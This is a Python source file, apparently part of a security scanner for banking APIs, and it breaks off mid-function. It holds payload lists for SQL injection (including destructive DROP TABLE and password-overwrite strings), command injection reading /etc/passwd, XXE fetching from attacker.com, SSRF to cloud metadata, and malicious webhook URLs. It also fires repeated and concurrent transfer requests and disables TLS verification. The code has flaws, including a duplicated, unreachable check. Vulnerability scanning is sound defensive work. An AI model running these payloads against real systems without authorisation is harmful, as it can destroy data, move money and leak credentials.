import requests
import urllib3
import warnings
import sys
import re
import json
import base64
import time
from urllib.parse import quote, unquote
from .progress_display import ProgressTracker

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

SECURITY_HEADERS = [
    "Content-Security-Policy",
    "X-Frame-Options",
    "Strict-Transport-Security",
    "X-Content-Type-Options",
    "Referrer-Policy",
    "Permissions-Policy",
    "X-XSS-Protection",
    "Cache-Control",
    "Pragma",
    "Expires",
    "Access-Control-Allow-Origin",
    "Access-Control-Allow-Methods",
    "Access-Control-Allow-Headers",
    "X-Permitted-Cross-Domain-Policies",
    "Feature-Policy"
]

# Comprehensive attack payloads
SQLI_PAYLOADS = [
    "' OR 1=1--",
    "' OR '1'='1",
    "'; DROP TABLE users;--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
    "' OR SLEEP(5)--",
    "'; WAITFOR DELAY '00:00:05'--",
    "'; WAITFOR DELAY '00:00:10'--",
    "'; WAITFOR DELAY '00:00:10'--",
    "'; WAITFOR DELAY '00:00:10'--",
    "'; WAITFOR DELAY '00:00:10'--",
    "'; WAITFOR DELAY '00:00:10'--",
    "'; WAITFOR DELAY '00:00:10'--",
    "'; WAITFOR DELAY '00:00:10'--",
    "'; WAITFOR DELAY '00:00:10'--",
    "'; WAITFOR DELAY '00:00:10'--",
    "'; WAITFOR DELAY '00:00:10'--",
    "' UNION SELECT version(),database(),user()--"
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<svg onload=alert('XSS')>",
    "'\"><script>alert('XSS')</script>",
    "<iframe src='javascript:alert(\"XSS\")'></iframe>",
    "<svg/onload=confirm('XSS')>",
    "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>"
]

# Banking-specific attack payloads
BANKING_PAYLOADS = {
    'double_spending': [
        '{"amount": 1000, "to_account": "1234567890", "idempotency_key": "duplicate_key_123"}',
        '{"amount": 1000, "to_account": "1234567890", "transaction_id": "replay_attack_456"}',
        '{"amount": 1000, "to_account": "1234567890", "timestamp": "2023-01-01T00:00:00Z"}'
    ],
    'race_conditions': [
        '{"amount": 999999, "account_id": "race_condition_test"}',
        '{"loan_amount": 1000000, "user_id": "concurrent_loan"}',
        '{"withdrawal_amount": 50000, "account_id": "overdraft_test"}'
    ],
    'transaction_manipulation': [
        '{"amount": -1000, "to_account": "1234567890"}',
        '{"amount": 0.01, "to_account": "1234567890"}',
        '{"amount": "999999999999", "to_account": "1234567890"}',
        '{"amount": null, "to_account": "1234567890"}',
        '{"amount": "NaN", "to_account": "1234567890"}'
    ],
    'privilege_escalation': [
        '{"user_id": "admin", "role": "super_admin"}',
        '{"user_id": "123", "role": "admin"}',
        '{"user_id": "456", "permissions": ["read", "write", "delete", "admin"]}'
    ],
    'bola_attacks': [
        '{"user_id": "123", "account_id": "456"}',
        '{"user_id": "789", "account_id": "123"}',
        '{"user_id": "admin", "account_id": "victim_account"}'
    ],
    'session_fixation': [
        '{"session_token": "stale_token_123", "user_id": "456"}',
        '{"jwt_token": "expired_jwt_456", "user_id": "789"}',
        '{"auth_token": "leaked_token_789", "user_id": "123"}'
    ],
    'kyc_bypass': [
        '{"kyc_status": "completed", "documents": "skipped"}',
        '{"kyc_level": "full", "verification": "bypassed"}',
        '{"identity_verified": true, "documents": "forged"}'
    ],
    'loan_abuse': [
        '{"loan_amount": 1000000, "income": 1000}',
        '{"loan_amount": 500000, "credit_score": 300}',
        '{"loan_amount": 750000, "employment": "fake"}'
    ],
    'discount_abuse': [
        '{"promo_code": "FIRST50", "user_id": "new_user_123"}',
        '{"cashback_code": "WELCOME100", "user_id": "multiple_accounts"}',
        '{"discount_code": "SAVE20", "user_id": "replay_attack"}'
    ],
    'webhook_abuse': [
        '{"webhook_url": "https://attacker.com/steal", "event": "payment_success"}',
        '{"callback_url": "http://malicious.com/capture", "event": "kyc_complete"}',
        '{"redirect_url": "https://phishing.com/fake", "event": "login_success"}'
    ],
    'open_redirects': [
        '{"redirect_url": "https://attacker.com/steal"}',
        '{"callback_url": "http://malicious.com/capture"}',
        '{"return_url": "https://phishing.com/fake"}'
    ],
    'micro_transactions': [
        '{"amount": 0.01, "frequency": "1000_per_second"}',
        '{"amount": 0.001, "frequency": "unlimited"}',
        '{"amount": 0.0001, "frequency": "burst"}'
    ],
    'idempotency_check': [
        '{"idempotency_key": "duplicate_key_123", "amount": 1000}',
        '{"transaction_id": "replay_attack_456", "amount": 1000}',
        '{"request_id": "same_request_789", "amount": 1000}'
    ]
}

# Command injection payloads
CMD_PAYLOADS = [
    "; ls -la",
    "| whoami",
    "& cat /etc/passwd",
    "; id",
    "| uname -a",
    "& ps aux",
    "; pwd",
    "| hostname",
    "& netstat -an",
    "; find / -name '*.conf'"
]

# XXE payloads
XXE_PAYLOADS = [
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/hostname">]><data>&file;</data>',
    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]><data>&exploit;</data>'
]

# SSRF payloads
SSRF_PAYLOADS = [
    "http://localhost:8080/admin",
    "http://127.0.0.1:3306",
    "http://169.254.169.254/latest/meta-data/",
    "http://10.0.0.1/admin",
    "http://192.168.1.1/config",
    "file:///etc/passwd",
    "dict://localhost:11211/stat",
    "ftp://localhost:21"
]

# Security check categories
SECURITY_CHECKS = {
    'critical': [
        'https_check',
        'open_endpoints',
        'sql_injection',
        'command_injection',
        'xxe',
        'ssrf',
        'auth_bypass',
        'double_spending',
        'race_conditions',
        'privilege_escalation',
        'bola_attacks'
    ],
    'high': [
        'xss',
        'nosql_injection',
        'ldap_injection',
        'path_traversal',
        'jwt_attacks',
        'mass_assignment',
        'insecure_deserialization',
        'business_logic',
        'transaction_manipulation',
        'session_fixation',
        'kyc_bypass',
        'loan_abuse',
        'webhook_abuse',
        'open_redirects'
    ],
    'medium': [
        'security_headers',
        'cors',
        'rate_limiting',
        'error_handling',
        'input_validation',
        'sensitive_data',
        'http_verb_tampering',
        'parameter_pollution',
        'timing_attacks',
        'information_disclosure',
        'discount_abuse',
        'micro_transactions',
        'verbose_errors',
        'metadata_leakage',
        'idempotency_check'
    ]
}

# Import the comprehensive validator
try:
    from .false_positive_validator import FalsePositiveValidator
    validator = FalsePositiveValidator()
except ImportError:
    # Fallback to simple validation if validator module is not available
    validator = None

# Import the security layer detector
try:
    from .security_layer_detector import SecurityLayerDetector
    security_detector = SecurityLayerDetector()
except ImportError:
    # Fallback if security layer detector is not available
    security_detector = None

def is_false_positive(response, baseline_response=None, payload="", attack_type=""):
    """
    Comprehensive false positive detection function with advanced validation
    Returns True if the response indicates a false positive (secure), False if it's a real vulnerability
    """
    # Use advanced validator if available
    if validator:
        result = validator.validate_response(
            response=response,
            baseline_response=baseline_response,
            payload=payload,
            attack_type=attack_type
        )
        return result.is_false_positive
    
    # Use security layer detector if available
    if security_detector:
        security_results = security_detector.detect_security_layers(response, payload)
        if security_results:
            # If any security layer blocked the request, it's a false positive
            return True
    
    # Fallback to simple validation
    # Check for WAF block page indicators
    waf_indicators = ['<!doctype', '<html', '<head', '<body', 'cloudflare', 'access denied', 'forbidden', 'ray id', 'blocked', 'security']
    if any(waf_indicator in response.text.lower() for waf_indicator in waf_indicators):
        return True  # WAF block page = secure, not vulnerable
    
    # Check for 403 status (WAF block)
    if response.status_code == 403:
        return True  # WAF block = secure, not vulnerable
    
    # Check if response is identical to baseline (no change = false positive)
    if baseline_response and response.text == baseline_response.text:
        return True  # Identical response = false positive
    
    # Check if response is very similar to baseline (small difference = likely false positive)
    if baseline_response and len(response.text) < len(baseline_response.text) * 1.1:
        return True  # Small difference = likely false positive
    
    # Check for session expired responses
    if response.status_code == 440 or "session" in response.text.lower():
        return True  # Session expired = test inconclusive
    
    # Check for authentication errors
    if response.status_code in [401, 403] and any(auth_indicator in response.text.lower() for auth_indicator in ['unauthorized', 'forbidden', 'access denied']):
        return True  # Auth error = not a vulnerability
    
    return False  # Not a false positive, could be real vulnerability

def get_security_layer_info(response, payload=""):
    """
    Get detailed information about security layers that may have blocked the request
    Returns a formatted message about security blocks
    """
    if not security_detector:
        return "Security layer detection not available"
    
    security_results = security_detector.detect_security_layers(response, payload)
    return security_detector.format_block_message(security_results)

def get_checks_for_severity(severity):
    """Get list of checks to run based on severity level"""
    if severity == 'all':
        all_checks = []
        for checks in SECURITY_CHECKS.values():
            all_checks.extend(checks)
        return all_checks
    elif severity in SECURITY_CHECKS:
        return SECURITY_CHECKS[severity]
    else:
        return []

def scan_api(api_url, curl_info=None, severity='all'):
    """
    Comprehensive API security scanner with banking-specific checks
    """
    print(f"🔍 Starting comprehensive security scan for: {api_url}")
    
    # Parse curl info if provided
    method = "GET"
    headers = {}
    data = None
    
    if curl_info:
        method = curl_info.get('method', 'GET')
        headers = curl_info.get('headers', {})
        data = curl_info.get('data')
    
    # Get checks to run
    checks_to_run = get_checks_for_severity(severity)
    print(f"📋 Running {len(checks_to_run)} security checks...")
    
    # Initialize progress tracker
    progress = ProgressTracker(len(checks_to_run))
    
    # Initialize results
    vulnerabilities = {
        'critical': [],
        'high': [],
        'medium': [],
        'low': []
    }
    
    # Create request function
    def req_func(url, headers=None, data=None, timeout=10):
        try:
            if method == "POST":
                return requests.post(url, headers=headers, data=data, timeout=timeout, verify=False)
            elif method == "PUT":
                return requests.put(url, headers=headers, data=data, timeout=timeout, verify=False)
            elif method == "DELETE":
                return requests.delete(url, headers=headers, data=data, timeout=timeout, verify=False)
            else:
                return requests.get(url, headers=headers, timeout=timeout, verify=False)
        except Exception as e:
            print(f"⚠️  Request failed: {e}")
            return None
    
    # Get baseline response
    try:
        resp = req_func(api_url, headers=headers, data=data)
        if resp is None:
            print("❌ Failed to get baseline response")
            # Return new structure even when baseline fails
            return {
                'vulnerabilities': vulnerabilities,
                'security_layers': {
                    'waf_detected': False,
                    'rate_limiting_detected': False,
                    'auth_blocks_detected': False,
                    'captcha_detected': False,
                    'challenge_detected': False,
                    'blocked_requests': [],
                    'security_layers': [],
                    'attack_blocks': {
                        'sql_injection': [],
                        'xss': [],
                        'command_injection': [],
                        'path_traversal': [],
                        'auth_bypass': [],
                        'banking_attacks': []
                    }
                }
            }
    except Exception as e:
        print(f"⚠️  Warning: Baseline request failed: {e}")
        # Create a mock response for testing
        resp = type('MockResponse', (), {
            'status_code': 200,
            'text': '{"status": "mock"}',
            'headers': {}
        })()
    
    # Run security checks
    for check in checks_to_run:
        progress.update_progress(f"Running {check}...")
        
        try:
            if check == 'https_check':
                # HTTPS check
                if not api_url.startswith('https://'):
                    vulnerabilities['critical'].append("HTTPS_NOT_ENABLED: API is not using HTTPS")
                progress.complete_check(f"Running {check}...", "complete")
            
            elif check == 'security_headers':
                # Security headers check
                missing_headers = []
                for header in SECURITY_HEADERS:
                    if header not in resp.headers:
                        missing_headers.append(header)
                
                if missing_headers:
                    vulnerabilities['medium'].append(f"MISSING_SECURITY_HEADERS: {', '.join(missing_headers)}")
                progress.complete_check(f"Running {check}...", "complete")
            
            elif check == 'sql_injection':
                # SQL Injection check
                sqli_vulnerabilities = []
                
                # Enhanced SQL injection detection patterns - prioritizing WAF-triggering payloads
                sql_patterns = [
                    # High-priority WAF-triggering patterns (these get blocked by Cloudflare)
                    "'; DROP TABLE users;--",
                    "1' OR '1' = '1'--",
                    "'; DROP DATABASE;--",
                    "'; DELETE FROM users;--",
                    "'; INSERT INTO users VALUES('admin','password');--",
                    "'; UPDATE users SET password='hacked';--",
                    "' UNION SELECT password FROM users--",
                    "' UNION SELECT user(),database(),version()--",
                    "'; EXEC xp_cmdshell('dir');--",
                    "'; SHUTDOWN;--",
                    
                    # Medium-priority patterns (some may trigger WAF)
                    "' OR 1=1 --", 
                    "' OR '1'='1", 
                    "' UNION SELECT",
                    "' OR 1=1#", 
                    "' OR 1=1/*",
                    "admin'--", 
                    "admin'#", 
                    "admin'/*",
                    "' OR 'x'='x", 
                    "' OR 1=1 OR '", 
                    "'; WAITFOR DELAY",
                    "' AND 1=1--", 
                    "' AND '1'='1", 
                    "1' OR '1' = '1'#", 
                    "1' OR '1' = '1'/*",
                    "') OR ('1'='1", 
                    "') OR ('1'='1'--",
                    "' OR '1'='1'--", 
                    "' OR '1'='1'#", 
                    "' OR '1'='1'/*",
                    "1' OR '1'='1'--", 
                    "1' OR '1'='1'#", 
                    "1' OR '1'='1'/*",
                    "' OR 1=1 OR '1'='1",
                    "admin' OR '1'='1'--", 
                    "admin' OR 1=1--",
                    "admin' OR '1'='1", 
                    "admin' OR 1=1"
                ]
                
                # First, check existing URL parameters for SQL injection patterns
                if '?' in api_url:
                    from urllib.parse import urlparse, parse_qs, unquote
                    parsed_url = urlparse(api_url)
                    params = parse_qs(parsed_url.query)
                    
                    for param_name, param_values in params.items():
                        for value in param_values:
                            decoded_value = unquote(value)
                            
                            # Check for SQL injection patterns in existing parameters
                            for pattern in sql_patterns:
                                if pattern.lower() in decoded_value.lower():
                                    sqli_vulnerabilities.append(f"EXISTING_PARAM_{param_name}: {decoded_value} | SQL Injection Pattern: {pattern}")
                                    break
                
                # Test with SQL injection payloads
                for payload in SQLI_PAYLOADS:
                    try:
                        # Test URL parameters
                        test_url = api_url + ("&" if "?" in api_url else "?") + f"test={quote(payload)}"
                        sqli_resp = req_func(test_url, headers=headers, data=data)
                        
                        if sqli_resp and not is_false_positive(sqli_resp, resp, payload, "sql_injection"):
                            # Check for SQL injection indicators
                            sql_indicators = ['sql', 'mysql', 'postgresql', 'oracle', 'sqlite', 'database', 'table', 'column', 'syntax']
                            if any(indicator in sqli_resp.text.lower() for indicator in sql_indicators):
                                sqli_vulnerabilities.append(f"URL_PARAM: {payload} | SQL Injection detected")
                        
                        # Test POST body if applicable
                        if data and method in ["POST", "PUT"]:
                            test_data = data + f"&test={quote(payload)}" if isinstance(data, str) else data
                            sqli_resp = req_func(api_url, headers=headers, data=test_data)
                            
                            if sqli_resp and not is_false_positive(sqli_resp, resp, payload, "sql_injection"):
                                if any(indicator in sqli_resp.text.lower() for indicator in sql_indicators):
                                    sqli_vulnerabilities.append(f"POST_BODY: {payload} | SQL Injection detected")
                        
                    except Exception as e:
                        continue
                
                if sqli_vulnerabilities:
                    vulnerabilities['critical'].extend(sqli_vulnerabilities)
                progress.complete_check(f"Running {check}...", "complete")
            
            elif check == 'xss':
                # XSS check
                xss_vulnerabilities = []
                
                for payload in XSS_PAYLOADS:
                    try:
                        # Test URL parameters
                        test_url = api_url + ("&" if "?" in api_url else "?") + f"test={quote(payload)}"
                        xss_resp = req_func(test_url, headers=headers, data=data)
                        
                        if xss_resp and not is_false_positive(xss_resp, resp, payload, "xss"):
                            # Check if payload is reflected in response
                            if payload.lower() in xss_resp.text.lower():
                                xss_vulnerabilities.append(f"URL_PARAM: {payload} | XSS payload reflected")
                        
                        # Test POST body if applicable
                        if data and method in ["POST", "PUT"]:
                            test_data = data + f"&test={quote(payload)}" if isinstance(data, str) else data
                            xss_resp = req_func(api_url, headers=headers, data=test_data)
                            
                            if xss_resp and not is_false_positive(xss_resp, resp, payload, "xss"):
                                if payload.lower() in xss_resp.text.lower():
                                    xss_vulnerabilities.append(f"POST_BODY: {payload} | XSS payload reflected")
                        
                    except Exception as e:
                        continue
                
                if xss_vulnerabilities:
                    vulnerabilities['high'].extend(xss_vulnerabilities)
                progress.complete_check(f"Running {check}...", "complete")
            
            elif check == 'command_injection':
                # Command injection check
                cmd_vulnerabilities = []
                
                # Command injection payloads
                cmd_payloads = [
                    '; ls', '; cat /etc/passwd', '; whoami', '; pwd',
                    '| ls', '| cat /etc/passwd', '| whoami', '| pwd',
                    '&& ls', '&& cat /etc/passwd', '&& whoami', '&& pwd',
                    '|| ls', '|| cat /etc/passwd', '|| whoami', '|| pwd',
                    '`ls`', '`cat /etc/passwd`', '`whoami`', '`pwd`',
                    '$(ls)', '$(cat /etc/passwd)', '$(whoami)', '$(pwd)'
                ]
                
                for payload in cmd_payloads:
                    try:
                        # Test URL parameters
                        test_url = api_url + ("&" if "?" in api_url else "?") + f"test={quote(payload)}"
                        cmd_resp = req_func(test_url, headers=headers, data=data)
                        
                        if cmd_resp and not is_false_positive(cmd_resp, resp, payload, "command_injection"):
                            # Check for command injection indicators
                            cmd_indicators = ['root:', 'bin:', 'usr:', 'etc:', 'uid=', 'gid=', 'home:', 'total ', 'drwx', '-rwx']
                            if any(indicator in cmd_resp.text.lower() for indicator in cmd_indicators):
                                cmd_vulnerabilities.append(f"URL_PARAM: {payload} | Command injection detected")
                        
                        # Test POST body if applicable
                        if data and method in ["POST", "PUT"]:
                            test_data = data + f"&test={quote(payload)}" if isinstance(data, str) else data
                            cmd_resp = req_func(api_url, headers=headers, data=test_data)
                            
                            if cmd_resp and not is_false_positive(cmd_resp, resp, payload, "command_injection"):
                                if any(indicator in cmd_resp.text.lower() for indicator in cmd_indicators):
                                    cmd_vulnerabilities.append(f"POST_BODY: {payload} | Command injection detected")
                        
                    except Exception as e:
                        continue
                
                if cmd_vulnerabilities:
                    vulnerabilities['critical'].extend(cmd_vulnerabilities)
                progress.complete_check(f"Running {check}...", "complete")
            
            elif check == 'command_injection':
                # Command injection check
                cmd_vulnerabilities = []
                
                for payload in CMD_PAYLOADS:
                    try:
                        # Test URL parameters
                        test_url = api_url + ("&" if "?" in api_url else "?") + f"test={quote(payload)}"
                        cmd_resp = req_func(test_url, headers=headers, data=data)
                        
                        if cmd_resp and not is_false_positive(cmd_resp, resp, payload, "command_injection"):
                            # Check for command output indicators
                            cmd_indicators = ['root:', 'bin:', 'usr:', 'etc:', 'uid=', 'gid=', 'home:', 'total ', 'drwx', '-rwx']
                            if any(indicator in cmd_resp.text.lower() for indicator in cmd_indicators):
                                cmd_vulnerabilities.append(f"URL_PARAM: {payload} | Command injection detected")
                        
                        # Test POST body if applicable
                        if data and method in ["POST", "PUT"]:
                            test_data = data + f"&test={quote(payload)}" if isinstance(data, str) else data
                            cmd_resp = req_func(api_url, headers=headers, data=test_data)
                            
                            if cmd_resp and not is_false_positive(cmd_resp, resp, payload, "command_injection"):
                                if any(indicator in cmd_resp.text.lower() for indicator in cmd_indicators):
                                    cmd_vulnerabilities.append(f"POST_BODY: {payload} | Command injection detected")
                        
                    except Exception as e:
                        continue
                
                if cmd_vulnerabilities:
                    vulnerabilities['critical'].extend(cmd_vulnerabilities)
                progress.complete_check(f"Running {check}...", "complete")
            
            elif check == 'double_spending':
                # Double spending check
                double_spending_vulns = []
                
                for payload in BANKING_PAYLOADS['double_spending']:
                    try:
                        # Send the same request multiple times
                        responses = []
                        for i in range(3):
                            test_resp = req_func(api_url, headers=headers, data=payload)
                            if test_resp:
                                responses.append(test_resp)
                            time.sleep(0.1)
                        
                        # Check if all responses are successful (potential double spending)
                        if len(responses) >= 2 and all(r.status_code == 200 for r in responses):
                            double_spending_vulns.append(f"DOUBLE_SPENDING: {payload} | All requests succeeded")
                        
                    except Exception as e:
                        continue
                
                if double_spending_vulns:
                    vulnerabilities['critical'].extend(double_spending_vulns)
                progress.complete_check(f"Running {check}...", "complete")
            
            elif check == 'race_conditions':
                # Race condition check
                race_condition_vulns = []
                
                for payload in BANKING_PAYLOADS['race_conditions']:
                    try:
                        # Send concurrent requests
                        import threading
                        responses = []
                        
                        def send_request():
                            try:
                                test_resp = req_func(api_url, headers=headers, data=payload)
                                if test_resp:
                                    responses.append(test_resp)
                            except:
                                pass
                        
                        threads = []
                        for i in range(3):  # 3 concurrent requests
                            thread = threading.Thread(target=send_request)
                            threads.append(thread)
                            thread.start()
                        
                        # Wait for all threads to complete
                        for thread in threads:
                            thread.join()
                        
                        # Check for race condition indicators
                        successful_responses = [r for r in responses if r.status_code == 200]
                        if len(successful_responses) > 1:
                            race_condition_vulns.append(f"RACE_CONDITION: {payload} | {len(successful_responses)} concurrent requests succeeded")
                        
                    except Exception as e:
                        continue
                
                if race_condition_vulns:
                    vulnerabilities['critical'].extend(race_condition_vulns)
                progress.complete_check(f"Running {check}...", "complete")
            
            elif check == 'privilege_escalation':
                # Privilege escalation check
                privilege_vulns = []
                
                for payload in BANKING_PAYLOADS['privilege_escalation']:
                    try:
                        test_resp = req_func(api_url, headers=headers, data=payload)
                        
                        if test_resp and not is_false_positive(test_resp, resp, payload, "privilege_escalation"):
                            if test_resp.status_code == 200:
                                privilege_vulns.append(f"PRIVILEGE_ESCALATION: {payload} | Admin access granted")
                            elif test_resp.status_code == 403:
                                # Check if response contains admin-related content
                                if any(admin_term in test_resp.text.lower() for admin_term in ['admin', 'super', 'privilege']):
                                    privilege_vulns.append(f"PRIVILEGE_ESCALATION: {payload} | Admin content in response")
                        
                    except Exception as e:
                        continue
                
                if privilege_vulns:
                    vulnerabilities['critical'].extend(privilege_vulns)
                progress.complete_check(f"Running {check}...", "complete")
            
            elif check == 'bola_attacks':
                # BOLA (Broken Object Level Authorization) check
                bola_vulns = []
                
                for payload in BANKING_PAYLOADS['bola_attacks']:
                    try:
                        test_resp = req_func(api_url, headers=headers, data=payload)
                        
                        if test_resp and not is_false_positive(test_resp, resp, payload, "bola"):
                            if test_resp.status_code == 200:
                                # Look for sensitive data in response
                                sensitive_indicators = ['account', 'balance', 'transaction', 'personal', 'ssn', 'pan', 'aadhaar']
                                if any(indicator in test_resp.text.lower() for indicator in sensitive_indicators):
                                    bola_vulns.append(f"BOLA_ATTACK: {payload} | Unauthorized access to sensitive data")
                        
                    except Exception as e:
                        continue
                
                if bola_vulns:
                    vulnerabilities['critical'].extend(bola_vulns)
                progress.complete_check(f"Running {check}...", "complete")
            
            elif check == 'transaction_manipulation':
                # Transaction manipulation check
                transaction_vulns = []
                
                for payload in BANKING_PAYLOADS['transaction_manipulation']:
                    try:
                        test_resp = req_func(api_url, headers=headers, data=payload)
                        
                        if test_resp and not is_false_positive(test_resp, resp, payload, "transaction_manipulation"):
                            if test_resp.status_code == 200:
                                transaction_vulns.append(f"TRANSACTION_MANIPULATION: {payload} | Request succeeded with invalid amount")
                            elif test_resp.status_code == 500:
                                transaction_vulns.append(f"TRANSACTION_MANIPULATION: {payload} | Server error indicates potential vulnerability")
                        
                    except Exception as e:
                        continue
                
                if transaction_vulns:
                    vulnerabilities['high'].extend(transaction_vulns)
                progress.complete_check(f"Running {check}...", "complete")
            
            elif check == 'session_fixation':
                # Session fixation check
                session_vulns = []
                
                for payload in BANKING_PAYLOADS['session_fixation']:
                    try:
                        test_resp = req_func(api_url, headers=headers, data=payload)
                        
                        if test_resp and not is_false_positive(test_resp, resp, payload, "session_fixation"):
                            if test_resp.status_code == 200:
                                session_vulns.append(f"SESSION_FIXATION: {payload} | Stale token accepted")
                            elif test_resp.status_code == 401:
                                # Check if response reveals token information
                                if any(token_term in test_resp.text.lower() for token_term in ['token', 'session', 'jwt', 'auth']):
                                    session_vulns.append(f"SESSION_FIXATION: {payload} | Token information leaked")
                        
                    except Exception as e:
                        continue
                
                if session_vulns:
                    vulnerabilities['high'].extend(session_vulns)
                progress.complete_check(f"Running {check}...", "complete")
            
            elif check == 'kyc_bypass':
                # KYC bypass check
                kyc_vulns = []
                
                for payload in BANKING_PAYLOADS['kyc_bypass']:
                    try:
                        test_resp = req_func(api_url, headers=headers, data=payload)
                        
                        if test_resp and not is_false_positive(test_resp, resp, payload, "kyc_bypass"):
                            if test_resp.status_code == 200:
                                kyc_vulns.append(f"KYC_BYPASS: {payload} | KYC verification bypassed")
                            elif test_resp.status_code == 500:
                                kyc_vulns.append(f"KYC_BYPASS: {payload} | Server error in KYC processing")
                        
                    except Exception as e:
                        continue
                
                if kyc_vulns:
                    vulnerabilities['high'].extend(kyc_vulns)
                progress.complete_check(f"Running {check}...", "complete")
            
            elif check == 'loan_abuse':
                # Loan abuse check
                loan_vulns = []
                
                for payload in BANKING_PAYLOADS['loan_abuse']:
                    try:
                        test_resp = req_func(api_url, headers=headers, data=payload)
                        
                        if test_resp and not is_false_positive(test_resp, resp, payload, "loan_abuse"):
                            if test_resp.status_code == 200:
                                loan_vulns.append(f"LOAN_ABUSE: {payload} | Loan approved with invalid criteria")
                            elif test_resp.status_code == 500:
                                loan_vulns.append(f"LOAN_ABUSE: {payload} | Server error in loan processing")
                        
                    except Exception as e:
                        continue
                
                if loan_vulns:
                    vulnerabilities['high'].extend(loan_vulns)
                progress.complete_check(f"Running {check}...", "complete")
            
            elif check == 'discount_abuse':
                # Discount abuse check
                discount_vulns = []
                
                for payload in BANKING_PAYLOADS['discount_abuse']:
                    try:
                        test_resp = req_func(api_url, headers=headers, data=payload)
                        
                        if test_resp and not is_false_positive(test_resp, resp, payload, "discount_abuse"):
                            if test_resp.status_code == 200:
                                discount_vulns.append(f"DISCOUNT_ABUSE: {payload} | Discount applied multiple times")
                            elif test_resp.status_code == 500:
                                discount_vulns.append(f"DISCOUNT_ABUSE: {payload} | Server error in discount processing")
                        
                    except Exception as e:
                        continue
                
                if discount_vulns:
                    vulnerabilities['medium'].extend(discount_vulns)
                progress.complete_check(f"Running {check}...", "complete")
            
            elif check == 'webhook_abuse':
                # Webhook abuse check
                webhook_vulns = []
                
                for payload in BANKING_PAYLOADS['webhook_abuse']:
                    try:
                        test_resp = req_func(api_url, headers=headers, data=payload)
                        
                        if test_resp and not is_false_positive(test_resp, resp, payload, "webhook_abuse"):
                            if test_resp.status_code == 200:
                                webhook_vulns.append(f"WEBHOOK_ABUSE: {payload} | Malicious webhook accepted")
                            elif test_resp.status_code == 500:
                                webhook_vulns.append(f"WEBHOOK_ABUSE: {payload} | Server error in webhook processing")
                        
                    except Exception as e:
                        continue
                
                if webhook_vulns:
                    vulnerabilities['high'].extend(webhook_vulns)
                progress.complete_check(f"Running {check}...", "complete")
            
            elif check == 'open_redirects':
                # Open redirects check
                redirect_vulns = []
                
                for payload in BANKING_PAYLOADS['open_redirects']:
                    try:
                        test_resp = req_func(api_url, headers=headers, data=payload)
                        
                        if test_resp and not is_false_positive(test_resp, resp, payload, "open_redirects"):
                            if test_resp.status_code in [200, 302, 301]:
                                # Check if response contains redirect to malicious URL
                                if any(malicious_url in test_resp.text.lower() for malicious_url in ['attacker.com', 'malicious.com', 'phishing.com']):
                                    redirect_vulns.append(f"OPEN_REDIRECT: {payload} | Redirect to malicious URL")
                        
                    except Exception as e:
                        continue
                
                if redirect_vulns:
                    vulnerabilities['high'].extend(redirect_vulns)
                progress.complete_check(f"Running {check}...", "complete")
            
            elif check == 'micro_transactions':
                # Micro-transaction abuse check
                micro_vulns = []
                
                for payload in BANKING_PAYLOADS['micro_transactions']:
                    try:
                        # Send multiple rapid requests
                        responses = []
                        for i in range(5):
                            test_resp = req_func(api_url, headers=headers, data=payload)
                            if test_resp:
                                responses.append(test_resp)
                            time.sleep(0.01)  # Very small delay
                        
                        # Check if all requests succeeded (potential abuse)
                        successful = [r for r in responses if r.status_code == 200]
                        if len(successful) >= 4:  # 80% success rate
                            micro_vulns.append(f"MICRO_TRANSACTION_ABUSE: {payload} | {len(successful)}/5 rapid requests succeeded")
                        
                    except Exception as e:
                        continue
                
                if micro_vulns:
                    vulnerabilities['medium'].extend(micro_vulns)
                progress.complete_check(f"Running {check}...", "complete")
            
            elif check == 'idempotency_check':
                # Idempotency check
                idempotency_vulns = []
                
                for payload in BANKING_PAYLOADS['idempotency_check']:
                    try:
                        # Send the same request multiple times
                        responses = []
                        for i in range(3):
                            test_resp = req_func(api_url, headers=headers, data=payload)
                            if test_resp:
                                responses.append(test_resp)
                            time.sleep(0.1)
                        
                        # Check if all requests succeeded (lack of idempotency)
                        if len(responses) >= 2 and all(r.status_code == 200 for r in responses):
                            idempotency_vulns.append(f"IDEMPOTENCY_FAILURE: {payload} | Duplicate requests all succeeded")
                        
                    except Exception as e:
                        continue
                
                if idempotency_vulns:
                    vulnerabilities['medium'].extend(idempotency_vulns)
                progress.complete_check(f"Running {check}...", "complete")
            
            elif check == 'verbose_errors':
                # Verbose error messages check
                verbose_vulns = []
                
                # Test with invalid payloads to trigger errors
                error_payloads = [
                    '{"invalid": "payload"}',
                    '{"amount": "invalid"}',
                    '{"user_id": null}',
                    '{"data": "malformed"}'
                ]
                
                for payload in error_payloads:
                    try:
                        test_resp = req_func(api_url, headers=headers, data=payload)
                        
                        if test_resp and test_resp.status_code in [400, 500]:
                            verbose_indicators = [
                                'stack trace', 'exception', 'error in', 'sql', 'database',
                                'table', 'column', 'syntax', 'mysql', 'postgresql', 'oracle',
                                'file path', 'directory', 'internal', 'debug', 'traceback'
                            ]
                            
                            if any(indicator in test_resp.text.lower() for indicator in verbose_indicators):
                                verbose_vulns.append(f"VERBOSE_ERROR: {payload} | Detailed error information exposed")
                        
                    except Exception as e:
                        continue
                
                if verbose_vulns:
                    vulnerabilities['medium'].extend(verbose_vulns)
                progress.complete_check(f"Running {check}...", "complete")
            
            elif check == 'metadata_leakage':
                # Metadata leakage check
                metadata_vulns = []
                
                try:
                    # Check for metadata leakage
                    metadata_indicators = [
                        'internal', 'debug', 'test', 'dev', 'staging', 'localhost',
                        '192.168.', '10.0.', '172.16.', '127.0.0.1',
                        'timestamp', 'created_at', 'updated_at', 'id', 'uuid',
                        'email', 'phone', 'address', 'ssn', 'pan', 'aadhaar'
                    ]
                    
                    if any(indicator in resp.text.lower() for indicator in metadata_indicators):
